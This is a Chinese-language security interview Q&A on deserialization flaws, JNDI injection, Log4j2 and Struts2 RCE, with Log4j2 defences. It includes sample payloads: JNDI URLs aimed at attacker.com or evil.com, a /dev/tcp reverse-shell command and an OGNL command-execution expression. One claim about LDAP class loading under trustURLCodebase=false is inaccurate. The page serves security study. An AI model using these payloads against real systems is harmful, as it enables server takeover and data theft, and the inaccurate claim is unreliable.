<h3 class="md-end-block md-heading"><span class="md-plain">1. 什么是序列化和反序列化？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">序列化</span></strong></span><span class="md-plain">：将内存中的对象转换为可存储（如文件、数据库）或可传输（如网络流）的字节流 / 字符串的过程。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">反序列化</span></strong></span><span class="md-plain">：将序列化后的字节流 / 字符串恢复为原对象的过程，是序列化的逆操作。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">2.为什么要进行序列化和反序列化？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">内存中的对象无法直接存储或传输，需通过序列化转换为通用格式（字节流 / 字符串）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">解决不同系统、语言、进程间的数据交换问题，确保对象状态的一致性。</span></p>
</li>
</ul>

<h3 class="md-end-block md-heading"><span class="md-plain">4. Java 序列化流程是什么？</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">对象所属类实现</span><span class="md-pair-s" spellcheck="false"><code>Serializable</code></span><span class="md-plain">接口（否则抛出</span><span class="md-pair-s" spellcheck="false"><code>NotSerializableException</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">创建</span><span class="md-pair-s" spellcheck="false"><code>ObjectOutputStream</code></span><span class="md-plain">并关联输出流（如文件流、网络流）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">调用</span><span class="md-pair-s" spellcheck="false"><code>writeObject()</code></span><span class="md-plain">，将对象转换为字节流并写入输出流。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">关闭流，完成序列化。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">5. Java 反序列化流程是什么？</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">创建</span><span class="md-pair-s" spellcheck="false"><code>ObjectInputStream</code></span><span class="md-plain">并关联输入流（如文件流、网络流）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">调用</span><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span><span class="md-plain">，从输入流读取字节流。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">验证类信息（类存在、</span><span class="md-pair-s" spellcheck="false"><code>serialVersionUID</code></span><span class="md-plain">匹配），通过反射重建对象并恢复属性值。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">返回重建后的对象，完成反序列化。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">6. Java 反序列化漏洞原理是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">攻击者构造恶意序列化数据，当目标应用反序列化该数据时，会触发类中重写的</span><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span><span class="md-plain">方法（或间接调用的危险方法），执行非预期操作（如远程代码执行 RCE）。核心是 “不可信数据被反序列化 + 存在可利用的危险方法”。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">7. 什么是 PHP 反序列化？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">PHP 通过</span><span class="md-pair-s" spellcheck="false"><code>unserialize()</code></span><span class="md-plain">函数将序列化字符串（如</span><span class="md-pair-s" spellcheck="false"><code>O:4:&quot;User&quot;:1:{s:4:&quot;name&quot;;s:5:&quot;Alice&quot;;}</code></span><span class="md-plain">）恢复为对象的过程，若类定义了魔术方法（如</span><span class="md-pair-s" spellcheck="false"><code>__wakeup()</code></span><span class="md-plain">），会自动触发。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">8. 反序列化魔术方法有哪些？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">PHP</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__construct()</code></span><span class="md-plain">：类的构造方法，在创建对象时进行初始化操作时调用。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__destruct()</code></span><span class="md-plain">：类的析构函数，在对象销毁时执行清理操作时调用。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__call()</code></span><span class="md-plain">：在对象中调用不可访问方法时调用。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__get()</code></span><span class="md-plain">：访问不存在的成员变量或访问 private 和 protected 成员变量时调用。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__set()</code></span><span class="md-plain">：设置类的成员变量时调用。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__isset()</code></span><span class="md-plain">：对不可访问属性调用</span><span class="md-pair-s" spellcheck="false"><code>isset()</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>empty()</code></span><span class="md-plain">时调用。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__unset()</code></span><span class="md-plain">：对不可访问属性调用</span><span class="md-pair-s" spellcheck="false"><code>unset()</code></span><span class="md-plain">时被调用。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__sleep()</code></span><span class="md-plain">：执行</span><span class="md-pair-s" spellcheck="false"><code>serialize()</code></span><span class="md-plain">时，会先调用这个函数。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__wakeup()</code></span><span class="md-plain">：执行</span><span class="md-pair-s" spellcheck="false"><code>unserialize()</code></span><span class="md-plain">时，会先调用这个函数。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>__toString()</code></span><span class="md-plain">：在</span><span class="md-pair-s" spellcheck="false"><code>echo</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>print</code></span><span class="md-plain">输出对象，或者把对象当作字符串调用时自动调用。</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Java</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span><span class="md-plain">：自定义反序列化逻辑，当对象被反序列化时自动调用，若方法中包含危险操作（如命令执行、JNDI 查询），是反序列化漏洞的核心利用点。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>writeObject()</code></span><span class="md-plain">：自定义序列化逻辑，序列化对象时自动调用，可控制写入字节流的数据内容。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>readObjectNoData()</code></span><span class="md-plain">：当反序列化过程中无法找到对应类的序列化数据时调用，可能导致对象状态异常。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>writeReplace()</code></span><span class="md-plain">：序列化时替换对象，返回一个替代对象用于序列化，可改变序列化的实际内容。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>readResolve()</code></span><span class="md-plain">：反序列化后替换对象，返回一个替代对象，常用于单例模式防止多实例创建，若实现不当可能引入安全风险。</span></p>
</li>
</ul>
</li>
</ul>

<h3 class="md-end-block md-heading"><span class="md-plain">11. 什么是 JNDI 注入？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">JNDI（Java Naming and Directory Interface，Java 命名和目录接口）是 Java 用于访问命名服务（如 RMI 注册表）和目录服务（如 LDAP 服务器）的 API，可通过统一接口查找远程对象或资源。</span> <span class="md-plain">JNDI 注入是指攻击者通过控制 JNDI 查找的目标名称（通常是 URL），使目标应用在执行</span><span class="md-pair-s" spellcheck="false"><code>InitialContext.lookup()</code></span><span class="md-plain">等 JNDI 查询操作时，被诱导连接到攻击者控制的恶意服务器，最终加载并执行恶意代码的攻击方式。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">12. JNDI 注入漏洞原理是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">当目标应用的 JNDI 查询参数（如查找的名称）可控（例如用户输入直接作为</span><span class="md-pair-s" spellcheck="false"><code>lookup()</code></span><span class="md-plain">方法的参数）时，攻击者可构造恶意的命名服务 URL（如</span><span class="md-pair-s" spellcheck="false"><code>jndi:rmi://attacker.com/evil</code></span><span class="md-plain">或</span><span class="md-pair-s" spellcheck="false"><code>jndi:ldap://attacker.com/evil</code></span><span class="md-plain">）。</span> <span class="md-plain">应用执行</span><span class="md-pair-s" spellcheck="false"><code>lookup()</code></span><span class="md-plain">时，会按照 URL 连接攻击者控制的远程服务（RMI/LDAP 服务器），并从该服务获取 “资源引用”（如指向恶意类的路径）。应用会自动从指定路径下载恶意类并加载执行，若类中包含恶意代码（如</span><span class="md-pair-s" spellcheck="false"><code>static</code></span><span class="md-plain">代码块中的命令执行逻辑），则触发远程代码执行（RCE）。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">13. RMI 的工作流程是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">RMI（Remote Method Invocation，远程方法调用）是 Java 实现跨进程通信的机制，核心是允许一个 JVM 中的对象调用另一个 JVM 中对象的方法，工作流程如下：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">服务端注册</span></strong></span><span class="md-plain">：远程对象（实现了远程接口的类）通过</span><span class="md-pair-s" spellcheck="false"><code>LocateRegistry.createRegistry()</code></span><span class="md-plain">在本地注册中心（默认端口 1099）注册，暴露服务名称和接口。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">客户端查找</span></strong></span><span class="md-plain">：客户端通过</span><span class="md-pair-s" spellcheck="false"><code>Naming.lookup()</code></span><span class="md-plain">或 JNDI 的</span><span class="md-pair-s" spellcheck="false"><code>InitialContext.lookup()</code></span><span class="md-plain">向注册中心查询远程对象的引用。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">建立连接</span></strong></span><span class="md-plain">：客户端获取远程对象的引用后，底层通过 TCP 建立与服务端的网络连接。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">远程调用</span></strong></span><span class="md-plain">：客户端调用远程对象的方法时，参数通过序列化传输到服务端；服务端执行方法后，将结果反序列化并返回给客户端。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">14. RMI-JNDI 的原理是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">RMI-JNDI 是指通过 JNDI 接口访问 RMI 服务的机制，允许客户端通过 JNDI 的</span><span class="md-pair-s" spellcheck="false"><code>lookup()</code></span><span class="md-plain">方法查找 RMI 注册中心的远程对象，原理如下：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">服务端可在 RMI 注册中心绑定一个</span><span class="md-pair-s" spellcheck="false"><code>Reference</code></span><span class="md-plain">对象（包含目标类的名称、代码基地 URL 等信息），而非直接绑定远程对象。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">客户端通过 JNDI 的</span><span class="md-pair-s" spellcheck="false"><code>lookup(&quot;rmi://server/name&quot;)</code></span><span class="md-plain">查询该</span><span class="md-pair-s" spellcheck="false"><code>Reference</code></span><span class="md-plain">时，会根据其中的代码基地 URL 下载对应的类文件（</span><span class="md-pair-s" spellcheck="false"><code>.class</code></span><span class="md-plain">），并在本地实例化该类。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">若下载的类中包含恶意代码（如</span><span class="md-pair-s" spellcheck="false"><code>static</code></span><span class="md-plain">代码块中的命令执行），则客户端在实例化时会自动执行，导致 RCE。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">15. RMI-JNDI 注入流程大概说一下？（含原理）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">流程及原理如下：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">攻击者准备</span></strong></span><span class="md-plain">：搭建恶意 RMI 服务器，注册一个</span><span class="md-pair-s" spellcheck="false"><code>Reference</code></span><span class="md-plain">对象，其中</span><span class="md-pair-s" spellcheck="false"><code>className</code></span><span class="md-plain">设为自定义恶意类名（如</span><span class="md-pair-s" spellcheck="false"><code>Evil</code></span><span class="md-plain">），</span><span class="md-pair-s" spellcheck="false"><code>codebase</code></span><span class="md-plain">设为攻击者控制的 HTTP 服务器地址（存放</span><span class="md-pair-s" spellcheck="false"><code>Evil.class</code></span><span class="md-plain">）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注入恶意 URL</span></strong></span><span class="md-plain">：攻击者通过目标应用的输入点（如用户可控的参数），将恶意 JNDI URL（</span><span class="md-pair-s" spellcheck="false"><code>jndi:rmi://attacker.com/evil</code></span><span class="md-plain">）注入到应用的 JNDI 查找逻辑中。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">应用触发查询</span></strong></span><span class="md-plain">：目标应用执行</span><span class="md-pair-s" spellcheck="false"><code>lookup()</code></span><span class="md-plain">时，解析 URL 并连接攻击者的 RMI 服务器，获取</span><span class="md-pair-s" spellcheck="false"><code>Reference</code></span><span class="md-plain">对象。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">加载恶意类</span></strong></span><span class="md-plain">：应用根据</span><span class="md-pair-s" spellcheck="false"><code>Reference</code></span><span class="md-plain">中的</span><span class="md-pair-s" spellcheck="false"><code>codebase</code></span><span class="md-plain">从 HTTP 服务器下载</span><span class="md-pair-s" spellcheck="false"><code>Evil.class</code></span><span class="md-plain">，并通过反射实例化该类。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">执行恶意代码</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>Evil.class</code></span><span class="md-plain">的</span><span class="md-pair-s" spellcheck="false"><code>static</code></span><span class="md-plain">代码块（如</span><span class="md-pair-s" spellcheck="false"><code>Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/attacker/port 0&gt;&amp;1&quot;)</code></span><span class="md-plain">）在类加载时自动执行，实现 RCE。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">16. LDAP-JNDI 注入是什么？（含攻击链）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">LDAP-JNDI 注入是指通过 JNDI 接口访问 LDAP 服务时触发的注入攻击，LDAP（Lightweight Directory Access Protocol）是用于查询目录服务的协议，攻击链如下：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">攻击者准备</span></strong></span><span class="md-plain">：搭建恶意 LDAP 服务器，在目录中创建一个条目（Entry），并为其设置</span><span class="md-pair-s" spellcheck="false"><code>javaNamingReference</code></span><span class="md-plain">属性（包含恶意类的名称和代码基地 URL）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注入恶意 URL</span></strong></span><span class="md-plain">：攻击者将恶意 JNDI URL（</span><span class="md-pair-s" spellcheck="false"><code>jndi:ldap://attacker.com/cn=evil</code></span><span class="md-plain">）注入目标应用的 JNDI 查找参数中。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">应用触发查询</span></strong></span><span class="md-plain">：目标应用执行</span><span class="md-pair-s" spellcheck="false"><code>lookup()</code></span><span class="md-plain">时，连接攻击者的 LDAP 服务器，查询指定条目，并获取</span><span class="md-pair-s" spellcheck="false"><code>javaNamingReference</code></span><span class="md-plain">属性。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">加载恶意类</span></strong></span><span class="md-plain">：应用根据属性中的代码基地 URL 下载恶意类（如</span><span class="md-pair-s" spellcheck="false"><code>Evil.class</code></span><span class="md-plain">），并在本地实例化。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">执行恶意代码</span></strong></span><span class="md-plain">：恶意类的</span><span class="md-pair-s" spellcheck="false"><code>static</code></span><span class="md-plain">代码块或构造方法中的命令执行逻辑被触发，实现 RCE。</span></p>
</li>
</ol>

<h3 class="md-end-block md-heading"><span class="md-plain">18. 讲述一下 RMI-JNDI 注入和 LDAP-JNDI 注入？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">RMI-JNDI 注入</span></strong></span><span class="md-plain">：利用 JNDI 访问 RMI 服务的机制，攻击者通过恶意 RMI 服务器返回</span><span class="md-pair-s" spellcheck="false"><code>Reference</code></span><span class="md-plain">对象，诱导目标应用下载并执行恶意类。但高版本 JDK 默认禁用 RMI 远程类加载，导致利用受限。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">LDAP-JNDI 注入</span></strong></span><span class="md-plain">：利用 JNDI 访问 LDAP 服务的机制，攻击者通过恶意 LDAP 服务器的目录条目返回</span><span class="md-pair-s" spellcheck="false"><code>javaNamingReference</code></span><span class="md-plain">属性，诱导目标应用加载远程恶意类。由于高版本 JDK 对 LDAP 的限制较弱（如允许从 HTTP 服务器加载类），实际场景中更易成功。</span> <span class="md-plain">两者的核心都是通过 JNDI 查找机制诱导目标加载执行恶意类，区别主要在于依赖的协议和 JDK 兼容性。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">19. 为什么 LDAP-JNDI 更常见于实战利用？</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">JDK 兼容性更好</span></strong></span><span class="md-plain">：高版本 JDK（如≥8u121）对 RMI 的远程类加载做了严格限制（默认禁止从</span><span class="md-pair-s" spellcheck="false"><code>codebase</code></span><span class="md-plain">加载类），但对 LDAP 的限制较弱 —— 即使</span><span class="md-pair-s" spellcheck="false"><code>com.sun.jndi.ldap.object.trustURLCodebase</code></span><span class="md-plain">为</span><span class="md-pair-s" spellcheck="false"><code>false</code></span><span class="md-plain">，仍可从 HTTP 服务器加载类（仅禁止 LDAP 直接返回类数据）。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">协议通用性更强</span></strong></span><span class="md-plain">：LDAP 协议在企业环境中更常见（常用于用户身份认证、目录服务），目标应用启用 LDAP-JNDI 查询的概率更高，攻击场景更广泛。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">绕过防御更易</span></strong></span><span class="md-plain">：LDAP 的目录条目结构灵活，攻击者可通过构造复杂的</span><span class="md-pair-s" spellcheck="false"><code>javaNamingReference</code></span><span class="md-plain">属性绕过应用层的简单过滤（如关键词拦截），而 RMI 的</span><span class="md-pair-s" spellcheck="false"><code>Reference</code></span><span class="md-plain">结构相对固定，易被检测。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">20. log4j 是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Log4j 是 Apache 基金会开发的一款开源日志记录工具，广泛应用于 Java 应用程序中，用于记录程序运行时的日志信息（如调试信息、错误信息等）。其功能包括日志级别控制、日志输出目的地（文件、控制台等）配置、日志格式自定义等，是 Java 生态中最常用的日志组件之一。目前主要版本包括 Log4j 1.x 和 Log4j 2.x（后者为重构版本，功能更强大）。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">21. Log4j 漏洞原理是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">通常所说的 Log4j 漏洞特指 Log4j2 中的 </span><span class="md-pair-s "><strong><span class="md-plain">JNDI 注入漏洞</span></strong></span><span class="md-plain">（CVE-2021-44228 等系列漏洞）。其核心原理是：Log4j2 在处理日志信息时，会对包含 </span><span class="md-pair-s" spellcheck="false"><code>${}</code></span><span class="md-plain"> 格式的字符串进行特殊解析，若日志内容中包含 JNDI 相关的 lookup 语法（如 </span><span class="md-pair-s" spellcheck="false"><code>${jndi:ldap://attacker.com/xxx}</code></span><span class="md-plain">），会触发 JNDI 服务调用，从攻击者控制的服务器加载恶意类并执行，最终导致远程代码执行（RCE）。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">22. Apache Log4j2 远程代码执行的攻击流程是什么？（含攻击链）</span></h3>
<p class="md-end-block md-p"><span class="md-plain">攻击流程与攻击链一致，具体步骤如下：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者准备恶意 payload（如 </span><span class="md-pair-s" spellcheck="false"><code>${jndi:ldap://evil.com/poc}</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过目标系统的输入点（如用户表单、URL 参数、API 请求等）将 payload 传入；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">目标系统处理输入时，使用 Log4j2 将包含 payload 的内容记录到日志中；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Log4j2 解析日志中的 </span><span class="md-pair-s" spellcheck="false"><code>${jndi:...}</code></span><span class="md-plain"> 占位符，触发 JNDI lookup，向 </span><span class="md-pair-s" spellcheck="false"><code>evil.com</code></span><span class="md-plain"> 发起 LDAP/RMI 请求；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者控制的 LDAP/RMI 服务器返回指向恶意 Java 类（如 </span><span class="md-pair-s" spellcheck="false"><code>Exploit.class</code></span><span class="md-plain">）的路径；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">目标系统加载并执行该恶意类，攻击者获得远程代码执行权限（如执行 </span><span class="md-pair-s" spellcheck="false"><code>calc.exe</code></span><span class="md-plain"> 或反弹 shell）。</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">23. 攻击者通常如何将 payload 注入到 Log4j2？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">攻击者通过目标系统的任何可输入点注入 payload，常见方式包括：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">网页表单输入（如用户名、搜索框）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">URL 参数（如 </span><span class="md-pair-s" spellcheck="false"><code>?username=${jndi:ldap://evil.com}</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">HTTP 头（如 </span><span class="md-pair-s" spellcheck="false"><code>User-Agent</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>Referer</code></span><span class="md-plain"> 等）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">API 请求体（如 JSON 数据中的字段）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">第三方服务交互（如消息队列、数据库查询结果中包含 payload）。</span> <span class="md-plain">只要输入内容被 Log4j2 记录，即可触发漏洞。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">24. Log4j2 JNDI 注入成功后的直接危害是什么？</span></h3>
<p class="md-end-block md-p"><span class="md-plain">直接危害是攻击者可在目标服务器上执行任意代码，包括但不限于：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">读取 / 修改 / 删除服务器文件；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">执行系统命令（如创建管理员账号、关闭服务）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">控制服务器网络（如发起内网渗透）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">窃取敏感数据（如数据库凭证、用户信息）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">25. 如何防御 Log4j2 JNDI 注入漏洞？</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">升级版本</span></strong></span><span class="md-plain">：将 Log4j2 升级至 2.15.0 及以上（修复了核心漏洞），或 2.17.0+（修复后续衍生漏洞）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">禁用 JNDI 功能</span></strong></span><span class="md-plain">：通过配置 </span><span class="md-pair-s" spellcheck="false"><code>log4j2.formatMsgNoLookups=true</code></span><span class="md-plain"> 禁用消息解析中的 JNDI lookup；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">限制 JNDI 访问</span></strong></span><span class="md-plain">：在 JVM 层面添加参数 </span><span class="md-pair-s" spellcheck="false"><code>-Dlog4j2.disableJndi=true</code></span><span class="md-plain"> 或 </span><span class="md-pair-s" spellcheck="false"><code>-Dcom.sun.jndi.rmi.object.trustURLCodebase=false</code></span><span class="md-plain"> 等，限制远程类加载；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">输入过滤</span></strong></span><span class="md-plain">：对用户输入的 </span><span class="md-pair-s" spellcheck="false"><code>${</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>jndi:</code></span><span class="md-plain"> 等敏感字符进行过滤或转义；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">网络隔离</span></strong></span><span class="md-plain">：限制服务器对外访问敏感协议（如 LDAP、RMI），阻止与恶意服务器通信；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">监控与检测</span></strong></span><span class="md-plain">：通过日志监控工具检测包含恶意 JNDI 字符串的请求，及时告警。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">26. Fastjson1.2.24 漏洞原理是什么？（含特征）</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">

<h3 class="md-end-block md-heading"><span class="md-plain">34. Struts2 远程代码执行漏洞原理</span></h3>
<p class="md-end-block md-p"><span class="md-plain">Struts2 是基于 MVC 架构的 Java Web 框架，其核心机制是通过拦截器处理 HTTP 请求，并使用 OGNL（Object Graph Navigation Language）表达式对请求参数进行动态求值。漏洞的根本原因在于</span><span class="md-pair-s "><strong><span class="md-plain">OGNL 表达式解析过程中未对用户输入进行严格过滤</span></strong></span><span class="md-plain">，导致攻击者可注入恶意表达式执行任意代码。</span></p>

<h5 class="md-end-block md-heading"><span class="md-pair-s "><strong><span class="md-plain">核心原理步骤</span></strong></span><span class="md-plain">：</span></h5>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">OGNL 表达式解析</span></strong></span><span class="md-plain">：</span> <span class="md-plain">Struts2 在处理请求参数时，会将参数值作为 OGNL 表达式解析。例如，表单字段或 URL 参数中的 </span><span class="md-pair-s" spellcheck="false"><code>${表达式}</code></span><span class="md-plain"> 会被动态求值。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">恶意表达式注入</span></strong></span><span class="md-plain">：</span> <span class="md-plain">攻击者构造特殊参数值，利用 OGNL 的强大功能（如访问静态方法、调用系统命令）执行代码。例如：</span></p>



```java
${#context['xwork.MethodAccessor.denyMethodExecution']=false, #_memberAccess['allowStaticMethodAccess']=true, @java.lang.Runtime@getRuntime().exec('id')}
```


<p class="md-end-block md-p"><span class="md-plain">该表达式通过修改访问权限并调用 </span><span class="md-pair-s" spellcheck="false"><code>Runtime.getRuntime().exec()</code></span><span class="md-plain"> 执行系统命令。</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">常见攻击向量</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
